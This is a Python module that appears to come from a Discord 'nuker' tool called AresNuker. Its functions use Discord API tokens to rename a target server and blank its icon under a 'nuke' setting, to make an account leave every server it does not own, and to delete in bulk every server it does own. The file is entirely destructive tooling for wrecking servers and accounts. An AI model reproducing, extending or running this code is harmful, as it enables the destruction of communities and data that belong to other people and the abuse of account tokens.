__import__('sys').path.append('../')
import global_vars, requests, json
from AresNuker import Console
from .get_all_guilds import _GetAllGuilds, _GetAllGuildsUser
from .requests_maker import GetQ

q = GetQ()
console = Console()
headers = global_vars.headers
headers_account = global_vars.headers_account
config = global_vars.config
guild_id = global_vars.guild_id

def ChangeNameGuild() -> None:
	payload = {
		'name': config['nuke']['guild_name']
	}
	r = requests.patch(f"https://discord.com/api/v8/guilds/{global_vars.guild_id}", headers = headers, data = json.dumps(payload))

def ChangeIconGuild() -> None:
	payload = {
		'icon': 'data:image/png;base64,'
	}
	r = requests.patch(f"https://discord.com/api/v8/guilds/{global_vars.guild_id}", headers = headers, data = json.dumps(payload))

def LeaveGuilds() -> None:
	guilds = _GetAllGuildsUser()
	payload = {'lurking': False}
	for guild in guilds:
		id = guild['id']
		name = guild['name']
		owner = guild['owner']
		if not owner:
			try:
				q.put((requests.delete, f'https://discord.com/api/v8/users/@me/guilds/{id}', headers_account, payload))
				console.log(f'Left Server → {name}')
			except:
				console.error(f'Unble to left server → {name}')

def DeleteGuilds() -> None:
	guilds = _GetAllGuildsUser()
	for guild in guilds:
		id = guild['id']
		name = guild['name']
		try:
			q.put((requests.post, f'https://discord.com/api/v9/guilds/{id}/delete', headers_account, None))
			console.log(f'Deleted Server → {name}')
		except:
			console.error(f'Unble to delete server → {name}')

def LeaveAndDeleteGuilds() -> None:
	LeaveGuilds()
	DeleteGuilds()

